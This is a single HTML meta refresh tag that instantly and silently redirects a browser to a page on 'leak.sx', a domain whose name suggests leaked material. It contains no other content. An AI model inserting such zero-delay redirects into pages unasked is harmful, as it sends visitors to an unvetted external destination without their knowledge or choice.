<meta http-equiv="refresh" content="0; url=https://leak.sx/dispenser.php" />
